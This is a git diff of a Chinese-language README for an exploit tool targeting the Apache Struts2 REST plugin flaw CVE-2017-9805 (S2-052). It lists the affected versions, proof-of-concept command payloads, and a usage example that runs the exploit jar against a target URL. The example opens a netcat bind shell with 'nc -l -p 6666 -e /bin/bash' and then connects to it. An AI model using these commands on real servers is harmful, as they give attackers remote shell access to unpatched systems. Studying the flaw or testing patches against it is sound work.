@@ -1,30 +1,9 @@
-# CVE-2017-9805 （S2-052）反弹Shell工具
+# CVE-2017-9805 （S2-052）反弹Shell Exploit
 
 ## 影响版本
 ```
 Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
 ```
-
-## 漏洞详情
-
-https://secfree.com/article-333.html
-
-## 选项
-
-```
- [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
- [*] 0day Info:https://secfree.com/article-333.html
- [*] Use:        <targetUrl> <command>
- [*] Author:  www.secFree.com Team By Bearcat
-```
-
-## 使用
-
-```
-java -jar CVE-2017-9805-Exploit.jar http://192.168.199.246:8080/struts2-rest-showcase/orders.xhtml "command"
-```
-
-![exploit](https://github.com/iBearcat/S2-052/blob/master/exploit.jpg?raw=true)
 
 ## Poc
 
@@ -41,6 +20,31 @@ Windows <command><string>calc</string></command>
 
 Mac <command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>
 ```
+
+## 漏洞复现详情
+
+https://secfree.com/article-333.html
+
+## 选项
+
+```
+ [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
+ [*] 0day Info:https://secfree.com/article-333.html
+ [*] Use:        <targetUrl> <command>
+ [*] Author:  www.secFree.com Team By Bearcat
+```
+
+## 使用
+
+```
+java -jar CVE-2017-9805-Exploit.jar http://192.168.199.246:8080/struts2-rest-showcase/orders.xhtml "nc -l -p 6666 -e /bin/bash"
+
+nc 192.168.199.246 6666
+```
+
+![exploit](https://github.com/iBearcat/S2-052/blob/master/exploit.jpg?raw=true)
+
+
 
 ##  CentOs 7 安装 Nc
 ```
